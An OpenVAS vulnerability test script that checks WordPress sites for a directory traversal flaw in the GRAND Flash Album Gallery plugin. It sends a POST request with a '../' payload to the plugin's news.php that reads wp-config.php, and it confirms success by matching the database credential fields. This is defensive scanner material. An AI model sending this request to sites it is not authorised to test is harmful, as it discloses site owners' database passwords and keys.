###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_grand_fia_gallery_plugin_dir_trav_vuln.nasl 13660 2019-02-14 09:48:45Z cfischer $
#
# WordPress GRAND Flash Album Gallery Plugin Multiple Vulnerabilities
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802015");
  script_version("$Revision: 13660 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 10:48:45 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2011-04-22 16:38:12 +0200 (Fri, 22 Apr 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("WordPress GRAND Flash Album Gallery Plugin Multiple Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/43648/");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16947/");
  script_xref(name:"URL", value:"http://www.htbridge.ch/advisory/file_content_disclosure_in_grand_flash_album_gallery_wordpress_plugin.html");
  script_xref(name:"URL", value:"http://www.htbridge.ch/advisory/sql_injection_in_grand_flash_album_gallery_wordpress_plugin.html");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to read arbitrary
  files via directory traversal attacks and gain sensitive information via SQL Injection attack.");

  script_tag(name:"affected", value:"WordPress GRAND Flash Album Gallery Version 0.55.");

  script_tag(name:"insight", value:"The flaws are due to

  - input validation error in 'want2Read' parameter to 'wp-content/plugins/
  flash-album-gallery/admin/news.php', which allows attackers to read
  arbitrary files via a ../(dot dot) sequences.

  - improper validation of user-supplied input via the 'pid' parameter to
  'wp-content/plugins/flash-album-gallery/lib/hitcounter.php', which allows
  attackers to manipulate SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"solution", value:"Upgrade to version 1.76 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"This host is installed with WordPress GRAND Flash Album Gallery
  Plugin and is prone to multiple vulnerabilities.");

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/flash-album-gallery");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

useragent = http_get_user_agent();
host = http_host_name( port:port );

postData = "want2Read=..%2F..%2F..%2F..%2Fwp-config.php&submit=submit";
path = dir + "/wp-content/plugins/flash-album-gallery/admin/news.php";

req = string("POST ", path, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(postData),
             "\r\n\r\n", postData);
res = http_send_recv(port:port, data:req);

if(ereg(pattern:"^HTTP/1\.[01] 200", string:res) && "DB_NAME" ><
   res && "DB_USER" >< res && "DB_PASSWORD" >< res && "AUTH_KEY" >< res)
{
  report = report_vuln_url(port:port, url:path);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);